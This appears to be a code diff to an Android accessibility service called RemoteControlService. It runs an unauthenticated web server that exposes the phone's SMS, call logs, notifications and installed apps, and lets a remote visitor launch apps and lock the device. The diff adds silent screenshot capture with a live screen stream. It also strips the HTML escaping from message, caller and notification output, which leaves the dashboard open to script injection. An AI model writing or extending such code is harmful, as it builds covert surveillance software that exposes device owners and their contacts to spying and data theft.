@@ -3,23 +3,21 @@ package com.example.devicemanager
 import android.accessibilityservice.AccessibilityService
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.graphics.Bitmap
 import android.net.Uri
 import android.os.Build
 import android.provider.CallLog
-import android.text.TextUtils
+import android.view.Display
 import android.view.accessibility.AccessibilityEvent
+import androidx.annotation.RequiresApi
 import fi.iki.elonen.NanoHTTPD
+import java.io.ByteArrayInputStream
+import java.io.ByteArrayOutputStream
 import java.text.SimpleDateFormat
-import java.util.Collections
 import java.util.Date
 import java.util.Locale
-
-data class NotificationModel(
-    val title: String,
-    val app: String,
-    val time: String,
-    val text: String
-)
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
 
 class RemoteControlService : AccessibilityService() {
 
@@ -27,8 +25,6 @@ class RemoteControlService : AccessibilityService() {
 
     companion object {
         var instance: RemoteControlService? = null
-        val capturedNotifications: MutableList<NotificationModel> =
-            Collections.synchronizedList(mutableListOf())
     }
 
     override fun onServiceConnected() {
@@ -37,7 +33,7 @@ class RemoteControlService : AccessibilityService() {
         try {
             if (server == null) {
                 server = WebServer(8080)
-                server?.start(NanoHTTPD.SOCKET_READ_TIMEOUT, false)
+                server?.start()
             }
         } catch (e: Exception) {
             e.printStackTrace()
@@ -47,15 +43,45 @@ class RemoteControlService : AccessibilityService() {
     override fun onDestroy() {
         super.onDestroy()
         server?.stop()
-        server = null
         instance = null
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
     override fun onInterrupt() {}
 
-    private fun escapeHtml(input: String?): String {
-        return TextUtils.htmlEncode(input ?: "")
+    private fun captureScreenBitmap(): Bitmap? {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return null
+
+        var resultBitmap: Bitmap? = null
+        val latch = CountDownLatch(1)
+
+        takeScreenshot(
+            Display.DEFAULT_DISPLAY,
+            mainExecutor,
+            object : TakeScreenshotCallback {
+                override fun onSuccess(screenshot: ScreenshotResult) {
+                    val hardwareBitmap = Bitmap.wrapHardwareBuffer(
+                        screenshot.hardwareBuffer,
+                        screenshot.colorSpace
+                    )
+                    // Convert hardware bitmap to software bitmap for JPEG compression
+                    resultBitmap = hardwareBitmap?.copy(Bitmap.Config.ARGB_8888, false)
+                    screenshot.hardwareBuffer.close()
+                    latch.countDown()
+                }
+
+                override fun onFailure(errorCode: Int) {
+                    latch.countDown()
+                }
+            }
+        )
+
+        try {
+            latch.await(2, TimeUnit.SECONDS)
+        } catch (e: InterruptedException) {
+            e.printStackTrace()
+        }
+        return resultBitmap
     }
 
     private fun getSmsHtml(): String {
@@ -72,23 +98,16 @@ class RemoteControlService : AccessibilityService() {
                 val addrIdx = it.getColumnIndex("address")
                 val bodyIdx = it.getColumnIndex("body")
                 val dateIdx = it.getColumnIndex("date")
-
                 while (it.moveToNext()) {
-                    val rawAddress = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
-                    val rawBody = if (bodyIdx != -1) it.getString(bodyIdx) else ""
-                    val rawDate = if (dateIdx != -1) it.getLong(dateIdx) else 0L
-
-                    val address = escapeHtml(rawAddress)
-                    val body = escapeHtml(rawBody)
-                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(rawDate))
-
-                    sb.append("<div class='card'><b>From: ").append(address).append("</b>")
-                        .append("<small style='float:right'>").append(date).append("</small>")
-                        .append("<p>").append(body).append("</p></div>")
+                    val address = it.getString(addrIdx) ?: "Unknown"
+                    val body = it.getString(bodyIdx) ?: ""
+                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(it.getLong(dateIdx)))
+                    sb.append("<div class='card'><b>From: ").append(address).append("</b><small style='float:right'>")
+                      .append(date).append("</small><p>").append(body).append("</p></div>")
                 }
             }
         } catch (e: Exception) {
-            return "<div class='card'><p>Error reading SMS: ${escapeHtml(e.message)}</p></div>"
+            return "<div class='card'><p>Error reading SMS: ${e.message}</p></div>"
         }
         return if (sb.isEmpty()) "<div class='card'><p>No SMS found in inbox.</p></div>" else sb.toString()
     }
@@ -98,16 +117,10 @@ class RemoteControlService : AccessibilityService() {
         try {
             val cursor = contentResolver.query(
                 CallLog.Calls.CONTENT_URI,
-                arrayOf(
-                    CallLog.Calls.NUMBER,
-                    CallLog.Calls.CACHED_NAME,
-                    CallLog.Calls.TYPE,
-                    CallLog.Calls.DATE,
-                    CallLog.Calls.DURATION
-                ),
+                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                 null,
                 null,
-                "${CallLog.Calls.DATE} DESC LIMIT 40"
+                CallLog.Calls.DATE + " DESC LIMIT 40"
             )
             cursor?.use {
                 val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
@@ -115,47 +128,45 @@ class RemoteControlService : AccessibilityService() {
                 val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                 val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                 val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
-
                 while (it.moveToNext()) {
-                    val rawNumber = if (numIdx != -1) it.getString(numIdx) ?: "Private Number" else "Private Number"
-                    val rawName = if (nameIdx != -1) it.getString(nameIdx) ?: rawNumber else rawNumber
-                    val rawType = if (typeIdx != -1) it.getInt(typeIdx) else -1
-                    val rawDate = if (dateIdx != -1) it.getLong(dateIdx) else 0L
-                    val rawDuration = if (durIdx != -1) it.getString(durIdx) ?: "0" else "0"
-
-                    val typeStr = when (rawType) {
+                    val number = it.getString(numIdx) ?: "Unknown"
+                    val name = it.getString(nameIdx) ?: number
+                    val type = when (it.getInt(typeIdx)) {
                         CallLog.Calls.INCOMING_TYPE -> "Incoming"
                         CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                         CallLog.Calls.MISSED_TYPE -> "Missed"
-                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
                         else -> "Call"
                     }
-
-                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(rawDate))
-                    val name = escapeHtml(rawName)
-                    val number = escapeHtml(rawNumber)
-
-                    sb.append("<div class='card'><b>").append(name).append(" (").append(typeStr).append(")</b>")
-                        .append("<small style='float:right'>").append(date).append("</small><p>")
-                        .append(number).append(" | Duration: ").append(rawDuration).append("s</p></div>")
+                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(it.getLong(dateIdx)))
+                    val duration = it.getString(durIdx) ?: "0"
+                    sb.append("<div class='card'><b>").append(name).append(" (").append(type).append(")</b>")
+                      .append("<small style='float:right'>").append(date).append("</small><p>")
+                      .append(number).append(" | Duration: ").append(duration).append("s</p></div>")
                 }
             }
         } catch (e: Exception) {
-            return "<div class='card'><p>Error reading call logs: ${escapeHtml(e.message)}<br><small>Grant Call Logs runtime permission.</small></p></div>"
+            return "<div class='card'><p>Error reading call logs: ${e.message}</p></div>"
         }
         return if (sb.isEmpty()) "<div class='card'><p>No call logs found.</p></div>" else sb.toString()
     }
 
     private fun getNotificationsHtml(): String {
         val sb = StringBuilder()
-        synchronized(capturedNotifications) {
-            for (item in capturedNotifications.reversed()) {
-                sb.append("<div class='card'><b>").append(escapeHtml(item.title))
-                    .append("</b> <small>(").append(escapeHtml(item.app)).append(" - ").append(escapeHtml(item.time))
-                    .append(")</small><p>").append(escapeHtml(item.text)).append("</p></div>")
+        try {
+            val field = Class.forName("com.example.devicemanager.AppNotificationListener")
+                .getField("notifications")
+            val list = field.get(null) as? List<*>
+            if (list != null) {
+                synchronized(list) {
+                    for (item in list.reversed()) {
+                        sb.append("<div class='card'>").append(item.toString()).append("</div>")
+                    }
+                }
             }
+        } catch (e: Exception) {
+            sb.append("<div class='card'><p>Notifications unlinked or empty.</p></div>")
         }
-        return if (sb.isEmpty()) "<div class='card'><p>No notifications captured yet.<br><small>Ensure Notification Access is enabled in Android Settings.</small></p></div>" else sb.toString()
+        return if (sb.isEmpty()) "<div class='card'><p>No notifications captured yet.</p></div>" else sb.toString()
     }
 
     inner class WebServer(port: Int) : NanoHTTPD(port) {
@@ -163,40 +174,57 @@ class RemoteControlService : AccessibilityService() {
             val uri = session.uri
             val params = session.parameters
 
+            // 1. Navigation Action Handlers
             if (uri == "/key") {
                 val action = params["action"]?.firstOrNull()
                 when (action) {
                     "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                     "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                     "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
-                    "lock" -> {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                            performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
-                        }
-                    }
+                    "lock" -> performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                 }
                 return newFixedLengthResponse("OK")
             }
 
+            // 2. Launch Application Handler
             if (uri == "/launch") {
                 val pkg = params["pkg"]?.firstOrNull()
                 if (!pkg.isNullOrEmpty()) {
                     val intent = packageManager.getLaunchIntentForPackage(pkg)?.apply {
                         addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                     }
-                    return if (intent != null) {
+                    if (intent != null) {
                         startActivity(intent)
-                        newFixedLengthResponse("Launched $pkg")
-                    } else {
-                        newFixedLengthResponse("Failed: Launch intent null")
+                        return newFixedLengthResponse("Launched $pkg")
                     }
+                    return newFixedLengthResponse("Failed: Launch intent null")
                 }
             }
 
+            // 3. Screen Frame Endpoint
+            if (uri == "/api/screen") {
+                val bitmap = captureScreenBitmap()
+                return if (bitmap != null) {
+                    val baos = ByteArrayOutputStream()
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos)
+                    val bytes = baos.toByteArray()
+                    newFixedLengthResponse(
+                        Response.Status.OK,
+                        "image/jpeg",
+                        ByteArrayInputStream(bytes),
+                        bytes.size.toLong()
+                    )
+                } else {
+                    newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Screen capture unavailable (Requires Android 11+)")
+                }
+            }
+
+            // 4. Dynamic AJAX Data Endpoints
             if (uri == "/api/sms") return newFixedLengthResponse(Response.Status.OK, "text/html", getSmsHtml())
             if (uri == "/api/calls") return newFixedLengthResponse(Response.Status.OK, "text/html", getCallLogsHtml())
             if (uri == "/api/notifs") return newFixedLengthResponse(Response.Status.OK, "text/html", getNotificationsHtml())
 
+            // 5. Installed Apps List
             val pm = packageManager
             val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                 .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
@@ -204,13 +232,14 @@ class RemoteControlService : AccessibilityService() {
 
             val appsHtml = StringBuilder()
             for (app in packages) {
-                val name = escapeHtml(app.loadLabel(pm).toString())
-                val pkg = escapeHtml(app.packageName)
+                val name = app.loadLabel(pm).toString()
+                val pkg = app.packageName
                 appsHtml.append("<li><span><b>").append(name).append("</b><br><small>").append(pkg)
-                    .append("</small></span><button onclick=\"launchApp('").append(pkg)
-                    .append("')\">Open</button></li>")
+                        .append("</small></span><button onclick=\"launchApp('").append(pkg)
+                        .append("')\">Open</button></li>")
             }
 
+            // 6. Dashboard Page
             val html = """
                 <!DOCTYPE html>
                 <html>
@@ -228,6 +257,8 @@ class RemoteControlService : AccessibilityService() {
                         li { background: #1e1e1e; padding: 12px; margin: 8px 0; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
                         .tab-pane { display: none; }
                         .show { display: block; }
+                        .screen-container { display: flex; flex-direction: column; align-items: center; gap: 12px; }
+                        .screen-preview { width: 100%; max-width: 340px; border-radius: 12px; border: 2px solid #333; background: #000; min-height: 200px; object-fit: contain; }
                     </style>
                 </head>
                 <body>
@@ -238,8 +269,9 @@ class RemoteControlService : AccessibilityService() {
                         <button onclick="fetch('/key?action=lock')" style="background:#dc2626;">Lock</button>
                     </div>
 
-                    <div style="display:flex; gap:8px; margin-bottom:16px;">
+                    <div style="display:flex; gap:6px; margin-bottom:16px;">
                         <button class="tab-btn active" onclick="switchTab('apps', this)">Apps</button>
+                        <button class="tab-btn" onclick="openScreenTab(this)">Screen</button>
                         <button class="tab-btn" onclick="loadTab('sms', this)">Messages</button>
                         <button class="tab-btn" onclick="loadTab('calls', this)">Calls</button>
                         <button class="tab-btn" onclick="loadTab('notifs', this)">Alerts</button>
@@ -249,12 +281,25 @@ class RemoteControlService : AccessibilityService() {
                         <ul>$appsHtml</ul>
                     </div>
 
+                    <div id="screen" class="tab-pane">
+                        <div class="screen-container">
+                            <div style="display:flex; gap:10px; width: 100%; max-width: 340px;">
+                                <button id="streamBtn" style="flex:1" onclick="toggleStream()">Start Stream</button>
+                                <button style="background:#374151" onclick="refreshFrame()">Refresh</button>
+                            </div>
+                            <img id="screenImg" class="screen-preview" alt="Screen preview" />
+                        </div>
+                    </div>
+
                     <div id="sms" class="tab-pane">Loading messages...</div>
                     <div id="calls" class="tab-pane">Loading call logs...</div>
                     <div id="notifs" class="tab-pane">Loading notifications...</div>
 
                     <script>
+                        let streamInterval = null;
+
                         function switchTab(id, elem) {
+                            stopStream();
                             document.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('show'));
                             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
                             document.getElementById(id).classList.add('show');
@@ -271,6 +316,40 @@ class RemoteControlService : AccessibilityService() {
                                 .catch(err => {
                                     document.getElementById(id).innerHTML = '<p>Failed to load data: ' + err + '</p>';
                                 });
+                        }
+
+                        function openScreenTab(elem) {
+                            switchTab('screen', elem);
+                            refreshFrame();
+                        }
+
+                        function refreshFrame() {
+                            const img = document.getElementById('screenImg');
+                            img.src = '/api/screen?t=' + Date.now();
+                        }
+
+                        function toggleStream() {
+                            const btn = document.getElementById('streamBtn');
+                            if (streamInterval) {
+                                stopStream();
+                            } else {
+                                btn.innerText = "Stop Stream";
+                                btn.style.background = "#dc2626";
+                                refreshFrame();
+                                streamInterval = setInterval(refreshFrame, 1000);
+                            }
+                        }
+
+                        function stopStream() {
+                            if (streamInterval) {
+                                clearInterval(streamInterval);
+                                streamInterval = null;
+                                const btn = document.getElementById('streamBtn');
+                                if (btn) {
+                                    btn.innerText = "Start Stream";
+                                    btn.style.background = "#2563eb";
+                                }
+                            }
                         }
 
                         function launchApp(pkg) {
